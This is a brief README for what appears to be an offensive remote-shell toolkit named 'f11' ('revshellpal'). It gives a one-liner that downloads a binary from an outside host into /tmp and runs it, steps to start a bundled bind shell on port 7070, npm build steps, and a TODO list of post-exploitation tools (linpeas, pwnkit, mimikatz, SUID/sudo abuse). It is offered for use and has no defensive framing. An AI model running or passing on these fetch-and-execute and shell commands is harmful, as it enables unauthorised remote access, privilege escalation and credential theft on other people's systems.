# f11
*revshellpal*

### TODO

- linpeas (all peas)
  - other similar enum?
- pwnkit
- mimikatz (windows)
- SUID/SUDO/CAP/
- 


### Oneliner

```bash
curl -sL https://f11snipe.cloud/f11.xz -o /tmp/f11.xz && xz -d /tmp/f11.xz && chmod +x /tmp/f11 && /tmp/f11
```


### Run included standalone bind shell

```bash
# Extract archive
xz -d f11-bind.xz

# Allow execute
chmod +x f11-bind

# Run rev bind shell (port 7070)
./f11-bind
```

### Build from source

```bash
# Run all build steps
npm install
npm run ci
```


#### Individual build steps
```bash
# Install npm packages
npm install

# Build TypeScript
npm build

# Compile
npm run compile

# Compress
npm run compress
```
